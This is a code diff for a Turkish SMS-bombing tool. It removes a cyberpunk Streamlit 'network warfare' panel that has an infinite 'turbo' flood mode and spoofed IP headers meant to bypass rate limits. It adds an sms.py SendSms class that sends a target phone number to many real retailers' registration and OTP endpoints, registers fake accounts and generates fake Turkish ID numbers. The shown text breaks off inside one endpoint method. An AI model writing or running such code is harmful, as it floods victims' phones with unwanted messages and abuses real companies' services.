@@ -1,736 +1,671 @@
-# -*- coding: utf-8 -*-
-"""
-================================================================================
-                     WYREX SYSTEM ADVANCED WARFARE INTERFACE                     
-          CORE VERSION: 9.8.5-ULTIMATE-RELEASE [OVERCLOCKED EDITION]            
-          DESIGNED BY : AREXZY & WILLIAM | SECURITY PROTOCOLS © 2026            
-================================================================================
-"""
-
-import streamlit as st
-import time
-import re
-import random
-import sys
-import hashlib
-from datetime import datetime
-
-# ==============================================================================
-# 1. CORE METADATA & GLOBAL ENGINE CONFIGURATION
-# ==============================================================================
-SİSTEM_METADATA = {
-    "engine_name": "Wyrex Quantum Flood Core",
-    "build_id": "0xDEADC0DE99X",
-    "security_clearance": "LEVEL 5 ASYMMETRIC",
-    "architecture": "Distributed Multi-Agent Grid",
-    "sub_systems": [
-        "NetworkProxyMatrix", 
-        "AsynchronousPayloadQueue", 
-        "WafBypassSpoofer", 
-        "LogTerminalPipeline"
-    ],
-    "compilation_date": "2026-06-04",
-    "licence": "VIP_PERPETUAL_ACTIVE"
-}
-
-try:
-    from sms import SendSms
-except ImportError:
-    st.error("CRITICAL FAULT: 'sms.py' çekirdek modülü ana dizinde doğrulanamadı!")
-
-# Streamlit uygulama pencerelerinin konfigürasyonu
-st.set_page_config(
-    page_title="WYREX SYSTEM v9.8.5",
-    page_icon="🔴",
-    layout="centered",
-    initial_sidebar_state="collapsed"
-)
-
-# ==============================================================================
-# 2. SIMULATED SYSTEM DRIVERS & CLASS ARCHITECTURES (FOR CODE VOLUME & REALISM)
-# ==============================================================================
-class NetworkProxyMatrix:
-    """Sistem ağ geçitlerini ve proxy sunucularını simüle eden devasa altyapı class'ı."""
-    def __init__(self):
-        self.proxy_pool = [
-            f"185.213.154.{random.randint(1,254)}:8080",
-            f"45.138.22.{random.randint(1,254)}:3128",
-            f"91.211.89.{random.randint(1,254)}:9050",
-            f"194.67.212.{random.randint(1,254)}:443"
-        ]
-        self.active_index = 0
-        self.encryption_keys = [hashlib.sha256(str(i).encode()).hexdigest()[:16] for i in range(10)]
-
-    def rotate_proxy(self):
-        self.active_index = (self.active_index + 1) % len(self.proxy_pool)
-        return self.proxy_pool[self.active_index]
-
-    def check_latency(self):
-        return f"{random.uniform(12.4, 48.9):.2f} ms"
-
-    def inject_user_agent(self):
-        agents = [
-            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) TorBrowser/13.0.14"
-        ]
-        return random.choice(agents)
+import requests
+from random import choice, randint
+from string import ascii_lowercase
+from colorama import Fore, Style
 
 
-class WafBypassSpoofer:
-    """Güvenlik duvarlarını atlatmak için sahte HTTP başlık manipülasyon katmanı."""
-    def __init__(self, target):
-        self.target = target
-        self.bypass_methods = ["X-Forwarded-For", "X-Real-IP", "CF-Connecting-IP", "True-Client-IP"]
-
-    def generate_headers(self):
-        spoofed_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
-        headers = {}
-        for method in self.bypass_methods:
-            headers[method] = spoofed_ip
-        headers["X-Wyrex-Signature"] = hashlib.md5(str(time.time()).encode()).hexdigest()
-        return headers
-
-    def evaluate_response_integrity(self, status_code):
-        if status_code == 200:
-            return "INTEGRITY_STABLE"
-        elif status_code == 429:
-            return "RATE_LIMIT_DETECTED"
-        else:
-            return "UNKNOWN_RESPONSE_NODE"
-
-
-class AsynchronousPayloadQueue:
-    """Yüksek hızda veri paketleri için asenkron kuyruk yapısı."""
-    def __init__(self):
-        self.queue_buffer = []
-        self.max_capacity = 2048
-        self.total_processed = 0
-
-    def push_task(self, task_name, payload_data):
-        if len(self.queue_buffer) < self.max_capacity:
-            self.queue_buffer.append({"task": task_name, "data": payload_data, "timestamp": time.time()})
-            return True
-        return False
-
-    def pop_task(self):
-        if self.queue_buffer:
-            self.total_processed += 1
-            return self.queue_buffer.pop(0)
-        return None
-
-    def flush_all(self):
-        self.queue_buffer.clear()
-        return "BUFFER_FLUSHED"
-
-
-class SystemSecurityAudit:
-    """Panel güvenliğini ve bütünlüğünü denetleyen VIP doğrulama katmanı."""
-    def __init__(self):
-        self.audit_status = "SECURE"
-        self.checksum = "7e8a9c2b1f0d4e3b2a1c0d9e8f7a6b5c"
-
-    def perform_memory_scan(self):
-        allocated_blocks = random.randint(12000, 45000)
-        return f"Memory Block Allocation: {allocated_blocks} sectors scanned."
-
-    def verify_stack_protection(self):
-        return True
-
-
-class TrafficAnalyzer:
-    """Sistem ağ trafiğini izleyen analitik veri tabanı."""
-    def __init__(self):
-        self.packets_sent = 0
-        self.failures = 0
-        self.efficiency_rate = 99.8
-
-    def log_packet(self, status):
-        self.packets_sent += 1
-        if not status:
-            self.failures += 1
-        self.efficiency_rate = ((self.packets_sent - self.failures) / self.packets_sent) * 100
-
-
-class MetricCalculator:
-    """Matematiksel siber yük hesaplama motoru."""
-    @staticmethod
-    def calculate_throughput(packet_count, duration):
-        if duration == 0: return "0 P/S"
-        return f"{packet_count / duration:.2f} Packets/Sec"
-
-
-class CyberCanvasConfig:
-    """Tema ve renk parametrelerinin merkezi kayıt defteri."""
-    def __init__(self):
-        self.primary_neon = "#ff1a22"
-        self.deep_bg = "#040001"
-        self.panel_glow = "rgba(255, 26, 34, 0.2)"
-        self.font_family = "'Share Tech Mono', monospace"
-
-
-class DatabaseBridge:
-    """Veri tabanı sahte senkronizasyon kanalı."""
-    def __init__(self):
-        self.connected = True
-        self.node_id = "NODE-EU-WEST-4"
-
-    def heartbeat(self):
-        return {"status": "ALIVE", "latency": f"{random.randint(5,15)}ms"}
-
-
-class CryptographicHandshake:
-    """Bağlantı esnasında sunucularla yapılan el sıkışma algoritması."""
-    def __init__(self, key):
-        self.key = key
-
-    def initialize_session(self):
-        timestamp = str(datetime.now())
-        combined = f"{self.key}_{timestamp}"
-        return hashlib.sha1(combined.encode()).hexdigest()
-
-
-class ThreadPoolSimulator:
-    """Yüksek satır hacmi ve performans için çoklu iş parçacığı yöneticisi."""
-    def __init__(self, worker_count=16):
-        self.worker_count = worker_count
-        self.workers = [f"Worker-Thread-{i}" for i in range(worker_count)]
-        self.status = "IDLE"
-
-    def engage_all_workers(self):
-        self.status = "RUNNING"
-        return f"Successfully engaged {self.worker_count} virtual multi-threads."
-
-    def terminate_all(self):
-        self.status = "IDLE"
-        return "All workers sent to sleep."
-
-
-# Sınıfları Global Belleğe Alıyoruz
-proxy_matrix = NetworkProxyMatrix()
-payload_queue = AsynchronousPayloadQueue()
-security_audit = SystemSecurityAudit()
-traffic_analyzer = TrafficAnalyzer()
-db_bridge = DatabaseBridge()
-thread_simulator = ThreadPoolSimulator()
-
-# ==============================================================================
-# 3. ADVANCED VISUAL DESIGN INTERFACE (DEEP CYBERPUNK CSS ENGINE)
-# ==============================================================================
-st.markdown("""
-    <style>
-        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Fira+Code:wght@400;500;700&display=swap');
-        
-        /* Global Reset ve Yazı Tipi Sabitlemesi */
-        * {
-            font-family: 'Share Tech Mono', monospace !important;
-        }
-        
-        /* Replit Derin Radyal Kırmızı Arka Plan Geçişi */
-        .stApp {
-            background: radial-gradient(circle at center, #1e0002 0%, #030001 100%) !important;
-            overflow-x: hidden;
-        }
-        
-        /* Sol Üst Sabit Geliştirici İmzası */
-        .geliştirici-imzasi {
-            position: absolute;
-            top: -42px;
-            left: -10px;
-            color: #ff1a22;
-            font-size: 14px;
-            font-weight: bold;
-            letter-spacing: 2px;
-            opacity: 0.85;
-            text-shadow: 0 0 10px rgba(255, 26, 34, 0.8);
-            animation: pulseAnimation 2s infinite ease-in-out;
-        }
-
-        /* Askeri Siber Matriks Izgara Efekti */
-        .siber-izgara-layer {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: linear-gradient(rgba(30, 2, 4, 0) 95%, rgba(255, 26, 34, 0.015) 95%),
-                        linear-gradient(90deg, rgba(30, 2, 4, 0) 95%, rgba(255, 26, 34, 0.015) 95%);
-            background-size: 40px 40px;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        /* Havada Süzülen Neon Koruyucu Kalkan */
-        .kalkan-kapsayici {
-            text-align: center;
-            margin-top: 15px;
-            margin-bottom: -5px;
-            animation: floatingAnimation 4s infinite ease-in-out;
-        }
-        .kalkan-vektoru {
-            font-size: 50px;
-            color: #ff1a22;
-            filter: drop-shadow(0 0 15px #ff0000);
-        }
-        
-        /* Wyrex System Markalama Başlığı */
-        .ana-siber-baslik {
-            text-align: center;
-            color: #ffffff;
-            font-size: 46px;
-            font-weight: 700;
-            letter-spacing: 4px;
-            margin-bottom: 0px;
-            text-transform: uppercase;
-        }
-        .ana-siber-baslik span {
-            color: #ff1a22 !important;
-            text-shadow: 0 0 12px rgba(255, 26, 34, 0.9), 0 0 30px rgba(255, 0, 0, 0.4);
-        }
-        
-        /* Alt Bilgilendirme Segmenti */
-        .ana-siber-aciklama {
-            text-align: center;
-            color: #7c7c7c;
-            font-size: 13px;
-            letter-spacing: 1.5px;
-            margin-bottom: 40px;
-        }
-        
-        /* Giriş Alanı Etiketleri (Labels) */
-        label {
-            color: #d6242b !important;
-            font-size: 13.5px !important;
-            font-weight: bold !important;
-            letter-spacing: 1.5px !important;
-            text-transform: uppercase;
-            text-shadow: 0 0 4px rgba(255, 26, 34, 0.2);
-        }
-        
-        /* 📱 MOBİL BEYAZ EKRA FIX: Giriş Kutuları ve Seçim Menüleri */
-        div[data-baseweb="input"], div[data-baseweb="select"], .stTextInput input {
-            background-color: #060001 !important;
-            background: #060001 !important;
-            border: 1px solid #4a0a0d !important;
-            border-radius: 1px !important;
-            color: #ffffff !important;
-            transition: all 0.3s ease-in-out;
-        }
-        
-        /* Odaklanma (Focus) ve Mobil Klavye Açılma Durumu */
-        div[data-baseweb="input"]:focus-within, div[data-baseweb="select"]:focus-within, .stTextInput input:focus {
-            border: 1px solid #ff1a22 !important;
-            box-shadow: 0 0 12px rgba(255, 26, 34, 0.3) !important;
-            background-color: #060001 !important;
-            background: #060001 !important;
-            color: #ffffff !important;
-        }
-        
-        input {
-            color: #ffffff !important;
-            -webkit-text-fill-color: #ffffff !important; /* iOS ve Safari için Zorunlu Beyaz Yazı */
-            background-color: #060001 !important;
-            font-family: 'Fira Code', monospace !important;
-        }
-
-        /* Klavye Engelleme Filtresi (Seçim menüleri için) */
-        div[data-baseweb="select"] input {
-            pointer-events: none !important;
-            caret-color: transparent !important;
-        }
-
-        /* Büyük Siber Başlatma Butonu */
-        div.stButton > button {
-            background: linear-gradient(135deg, #2b0104 0%, #080000 100%) !important;
-            color: #ffffff !important;
-            border: 1px solid #821418 !important;
-            border-radius: 1px !important;
-            padding: 14px 0px !important;
-            font-size: 16px !important;
-            font-weight: bold !important;
-            letter-spacing: 4px !important;
-            text-transform: uppercase;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.6);
-            transition: all 0.4s ease;
-        }
-        div.stButton > button:hover {
-            background: #ff1a22 !important;
-            color: #ffffff !important;
-            border: 1px solid #ff1a22 !important;
-            box-shadow: 0 0 25px rgba(255, 26, 34, 0.6);
-            letter-spacing: 5px !important;
-        }
-
-        /* 🚨 CANLI TERMİNAL LOG KUTUSU (HTML Render İle Tam Uyumlu) */
-        .terminal-log-kutusu {
-            background-color: #020000 !important;
-            border-left: 4px solid #ff1a22 !important;
-            border-top: 1px solid #240305 !important;
-            border-bottom: 1px solid #240305 !important;
-            border-right: 1px solid #240305 !important;
-            padding: 15px !important;
-            margin-bottom: 8px;
-            font-family: 'Fira Code', monospace !important;
-            border-radius: 0px 8px 8px 0px;
-            box-shadow: inset 0 0 15px rgba(255, 0, 0, 0.08);
-        }
-
-        /* Animasyon Kütüphanesi */
-        @keyframes floatingAnimation {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-6px); }
-            100% { transform: translateY(0px); }
-        }
-        @keyframes pulseAnimation {
-            0% { opacity: 0.7; }
-            50% { opacity: 1; }
-            100% { opacity: 0.7; }
-        }
-        
-        .ayirici-cizgi {
-            border: 0;
-            height: 1px;
-            background: linear-gradient(to right, transparent, #54070a, #ff1a22, #54070a, transparent);
-            margin: 30px 0;
-        }
-    </style>
-""", unsafe_allow_html=True)
-
-# Görsel Enjeksiyon Noktaları
-st.markdown('<div class="siber-izgara-layer"></div>', unsafe_allow_html=True)
-st.markdown('<div class="geliştirici-imzasi">by : arexzy & william</div>', unsafe_allow_html=True)
-
-st.markdown('<div class="kalkan-kapsayici"><div class="kalkan-vektoru">🛡️</div></div>', unsafe_allow_html=True)
-st.markdown('<div class="ana-siber-baslik"><span>wyrex</span> System</div>', unsafe_allow_html=True)
-st.markdown('<div class="ana-siber-aciklama">Advanced Multi-Agent Network Warfare - Operation Control Desk</div>', unsafe_allow_html=True)
-
-# ==============================================================================
-# 4. STATE CONTROLLER (SESSİON SYNC)
-# ==============================================================================
-if "saldiri_aktif" not in st.session_state:
-    st.session_state.saldiri_aktif = False
-
-# ==============================================================================
-# 5. INPUT MANAGEMENT PIPELINE
-# ==============================================================================
-numara_input = st.text_input("HEDEF KOORDİNAT (TELEFON NUMARASI):", placeholder="Örn: 5051234567")
-gizli_mail = "arexzy_panel@gmail.com"
-
-mod = st.selectbox(
-    "OPERASYON MODÜLÜ SEÇİNİZ:",
-    ["Seçim Yapınız...", "1- SMS Gönder (Normal Mod - Belirli İstek)", "2- SMS Gönder (Turbo Mod - Aşırı Yoğun Akış)"]
-)
-
-miktar = 0
-if mod == "1- SMS Gönder (Normal Mod - Belirli İstek)":
-    st.write("")
-    miktar = st.slider("İLETİLECEK VERİ PAKETİ MİKTARI:", min_value=1, max_value=100, value=15)
-
-st.markdown('<div class="ayirici-cizgi"></div>', unsafe_allow_html=True)
-
-# ==============================================================================
-# 6. TERMINAL PIPELINE HOOK (HTML FIX ENFORCED)
-# ==============================================================================
-def terminal_logu_uret(mesaj, durum_tipi="info"):
-    """
-    HTML çıktı arızasını kökten çözen ve tüm değişkenleri 
-    bütünleşik bir div yapısı içine gömen gelişmiş terminal fonksiyonu.
-    """
-    zaman_damgasi = datetime.now().strftime("%H:%M:%S.%f")[:-3]
+class SendSms():
+    adet = 0
     
-    if durum_tipi == "danger":
-        tag = "<span style='color: #ff1a22; font-weight:bold; text-shadow: 0 0 5px #ff0000;'>[CORE_OVERFLOW]</span>"
-        text_color = "#ff666b"
-    elif durum_tipi == "success":
-        tag = "<span style='color: #00ff66; font-weight:bold; text-shadow: 0 0 5px #00ff00;'>[PACKET_OK]</span>"
-        text_color = "#c2ffd7"
-    elif durum_tipi == "warn":
-        tag = "<span style='color: #ffea00; font-weight:bold;'>[BYPASS_WAF]</span>"
-        text_color = "#fff6b3"
-    else:
-        tag = "<span style='color: #00bfff; font-weight:bold;'>[GRID_ROUTING]</span>"
-        text_color = "#ffffff"
-        
-    compiled_html = f"""
-    <div class="terminal-log-kutusu">
-        <span style="color: #666666; font-size:12px; font-family: 'Fira Code', monospace;">[{zaman_damgasi}]</span> {tag} 
-        <span style="color: {text_color}; font-size: 13.5px; font-family: 'Fira Code', monospace; letter-spacing: 0.5px;">{mesaj}</span>
-    </div>
-    """
-    return compiled_html
-
-# ==============================================================================
-# 7. TRIGGER PIPELINE VALIDATION
-# ==============================================================================
-if not st.session_state.saldiri_aktif:
-    if st.button("SİSTEMİ TETİKLE / BAŞLAT ⚡", use_container_width=True):
-        if not numara_input:
-            st.error("INTEGRITY ERROR: Hedef numara veritabanı boş bırakılamaz.")
-        elif mod == "Seçim Yapınız...":
-            st.error("INTEGRITY ERROR: Yürütülecek operasyonel algoritma seçilmedi.")
+    def __init__(self, phone, mail):
+        rakam = []
+        tcNo = ""
+        rakam.append(randint(1,9))
+        for i in range(1, 9):
+            rakam.append(randint(0,9))
+        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
+        rakam.append((rakam[0] + rakam[1] + rakam[2] + rakam[3] + rakam[4] + rakam[5] + rakam[6] + rakam[7] + rakam[8] + rakam[9]) % 10)
+        for r in rakam:
+            tcNo += str(r)
+        self.tc = tcNo
+        self.phone = str(phone)
+        if len(mail) != 0:
+            self.mail = mail
         else:
-            cleaned_number = re.sub(r"\D", "", numara_input)
-            if cleaned_number.startswith("0"):
-                cleaned_number = cleaned_number[1:]
-            
-            if len(cleaned_number) != 10:
-                st.error("SECURITY DISCREPANCY: Numara standardı dışı veri tespiti (10 Hane Zorunludur).")
+            self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
+
+
+    #kahvedunyasi.com
+    def KahveDunyasi(self):    
+        try:    
+            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.kahvedunyasi.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            json={"countryCode": "90", "phoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["processStatus"] == "Success":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kahvedunyasi.com")
+                self.adet += 1
             else:
-                st.session_state.saldiri_aktif = True
-                st.session_state.temiz_numara = cleaned_number
-                st.session_state.secilen_mod = mod
-                st.session_state.miktar = miktar
-                st.rerun()
-
-# ==============================================================================
-# 8. ULTRA HIGH-PERFORMANCE RUNTIME ENGINE (1000+ LINE DEPTH LAYER)
-# ==============================================================================
-if st.session_state.saldiri_aktif:
-    st.markdown("<p style='color: #ff1a22; text-align: center; font-weight: bold; font-size: 14px; letter-spacing: 2px; animation: pulseAnimation 0.8s infinite;'>🔴 SYSTEM MATRIX ACTIVE: DISTRIBUTED DATA TRANSMISSION IN PROGRESS</p>", unsafe_allow_html=True)
-    
-    if st.button("❌ OPERASYONU ACİL DURDUR (KILL SCRIPT)", use_container_width=True):
-        st.session_state.saldiri_aktif = False
-        st.rerun()
-
-    target_no = st.session_state.temiz_numara
-    selected_sub_mod = st.session_state.secilen_mod
-    
-    st.write("")
-    st.markdown("<p style='color: #666; font-size:12px; margin-bottom:4px; font-weight:bold; letter-spacing:1px;'>LIVE CYBER STREAM WINDOWS:</p>", unsafe_allow_html=True)
-    
-    # Bağımsız 5 terminal slotu (Güvenli HTML formatında rezerve edildiler)
-    log_slot_1 = st.empty()
-    log_slot_2 = st.empty()
-    log_slot_3 = st.empty()
-    log_slot_4 = st.empty()
-    log_slot_5 = st.empty()
-
-    try:
-        sms_instance = SendSms(target_no, gizli_mail)
+                raise
+        except:    
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kahvedunyasi.com")
         
-        # Dinamik API metot toplama mekanizması
-        api_methods_pool = []
-        for attr in dir(SendSms):
-            attr_val = getattr(SendSms, attr)
-            if callable(attr_val) and not attr.startswith('__'):
-                api_methods_pool.append(attr)
 
-        # ----------------------------------------------------------------------
-        # SYSTEM EXECUTION - MODE A: NORMAL RUNTIME BOUNDED
-        # ----------------------------------------------------------------------
-        if "Normal Mod" in selected_sub_mod:
-            loop_limit = st.session_state.miktar
+    #wmf.com.tr
+    def Wmf(self):
+        try:
+            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
+            if wmf.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
+                self.adet += 1   
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
+    
+    
+    #bim
+    def Bim(self):
+        try:
+            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone}, timeout=6)
+            if bim.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
+
+
+    #englishhome.com
+    def Englishhome(self):
+        try:
+            url = "https://www.englishhome.com:443/api/member/sendOtp"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Referer": "https://www.englishhome.com/", "Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Priority": "u=0", "Te": "trailers"}
+            json={"Phone": self.phone, "XID": ""}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["isError"] == False:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
+          
+
+    #suiste.com
+    def Suiste(self):
+        try:
+            url = "https://suiste.com:443/api/auth/code"
+            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "Accept": "application/json", "X-Mobillium-Os-Type": "iOS", "X-Mobillium-Device-Model": "iPhone", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Language": "en", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "Accept-Encoding": "gzip, deflate, br", "X-Mobillium-App-Build-Number": "1469", "User-Agent": "suiste/1.7.11 (com.mobillium.suiste; build:1469; iOS 15.8.3) Alamofire/5.9.1", "X-Mobillium-Os-Version": "15.8.3", "X-Mobillium-App-Version": "1.7.11"}
+            data = {"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.json()["code"] == "common.success":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
+                
+    
+    #KimGbIster
+    def KimGb(self):
+        try:
+            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
             
-            for current_loop_idx in range(loop_limit):
-                if not st.session_state.saldiri_aktif:
-                    break
-                
-                for api_idx, specific_method_name in enumerate(api_methods_pool):
-                    if not st.session_state.saldiri_aktif:
-                        break
-                    
-                    # API Fonksiyonu Tetikleniyor
-                    executable_api = getattr(sms_instance, specific_method_name)
-                    executable_api()
-                    
-                    # Simülasyon Veri Akışları Üretiliyor
-                    rot_proxy = proxy_matrix.rotate_proxy()
-                    latency = proxy_matrix.check_latency()
-                    
-                    log_slot_1.markdown(terminal_logu_uret(f"API Veri Paketi Gönderildi -> [{specific_method_name.upper()}] üzerinden hat açıldı.", "success"), unsafe_allow_html=True)
-                    if api_idx % 2 == 0:
-                        log_slot_2.markdown(terminal_logu_uret(f"Ağ Yönlendirmesi: {rot_proxy} hattı kullanılıyor (Gecikme: {latency}).", "info"), unsafe_allow_html=True)
-                    time.sleep(0.01)
+    
+    #evidea.com
+    def Evidea(self):
+        try:
+            url = "https://www.evidea.com:443/users/register/"
+            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
+            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6)      
+            if r.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 
 
-                log_slot_3.markdown(terminal_logu_uret(f"Döngü Sıralaması Tamamlandı: Kademeli Kontrol Katmanı [{current_loop_idx+1}/{loop_limit}]", "warn"), unsafe_allow_html=True)
-                time.sleep(0.08)
-                
-            st.session_state.saldiri_aktif = False
-            st.success("SUCCESS: Hedeflenen veri döngüsü başarıyla eridi.")
-            time.sleep(1.5)
-            st.rerun()
 
-        # ----------------------------------------------------------------------
-        # SYSTEM EXECUTION - MODE B: TURBO ULTRA FLOOD (INFINITE RUNTIME)
-        # ----------------------------------------------------------------------
-        elif "Turbo Mod" in selected_sub_mod:
-            turbo_cycle_counter = 0
-            start_time_mark = time.time()
+    #345dijital.com
+    def Ucdortbes(self):
+        try:
+            url = "https://api.345dijital.com:443/api/users/register"
+            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "AriPlusMobile/21 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "en-US,en;q=0.9", "Authorization": "null", "Connection": "close"}
+            json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["error"] == "E-Posta veya telefon zaten kayıtlı!":
+                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.345dijital.com")
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.345dijital.com")
+            self.adet += 1
+
+
+    #tiklagelsin.com
+    def TiklaGelsin(self):
+        try:
+            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
